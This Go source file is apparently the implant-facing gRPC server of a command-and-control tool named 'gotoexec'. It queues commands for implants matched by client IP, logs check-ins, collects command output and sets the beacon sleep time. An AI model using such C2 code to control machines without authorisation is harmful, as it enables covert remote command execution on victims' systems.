/*
 * @Description:
 * @Version: 2.0
 * @Autor: ABing
 * @Date: 2024-06-19 11:23:41
 * @LastEditors: lhl
 * @LastEditTime: 2024-06-19 18:26:06
 */
package implant

import (
	"context"
	"errors"
	"fmt"
	"gotoexec/config"
	"gotoexec/global"
	"gotoexec/grpcapi"
	"log"
	"net"
	"time"

	"google.golang.org/grpc/peer"
)

type implantServer struct {
	work, output chan *grpcapi.Command
}

func NewImplantServer(work, output chan *grpcapi.Command) *implantServer {
	s := new(implantServer)
	s.work = work
	s.output = output
	return s
}

func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.Command, error) {

	p, ok := peer.FromContext(ctx)
	if !ok {
		log.Println("Failed to get peer info")
	}

	clientIP, _, err := net.SplitHostPort(p.Addr.String())
	if err != nil {
		log.Printf("Failed to parse client IP: %v", err)
	}

	log.Printf("Client IP: %s", clientIP)

	global.LoginQue = append(global.LoginQue, global.LoginLog{Ip: clientIP, Time: time.Now().Unix()})

	var cmd = new(grpcapi.Command)
	select {
	case cmd, ok := <-s.work:
		if ok {

			if cmd.Ip != clientIP {
				s.work <- cmd
				log.Println("不是客户端", clientIP, "的数据,是", cmd.Ip)
				return cmd, errors.New("不是我的")
			}

			return cmd, nil
		}
		return cmd, errors.New("channel closed")
	default:
		return cmd, nil
	}
}
func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) {
	s.output <- result
	fmt.Println("result:" + result.In + result.Out)
	return &grpcapi.Empty{}, nil
}
func (s *implantServer) GetSleepTime(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.SleepTime, error) {
	time := new(grpcapi.SleepTime)
	time.Time = config.CoreConf.SleepTime
	return time, nil
}
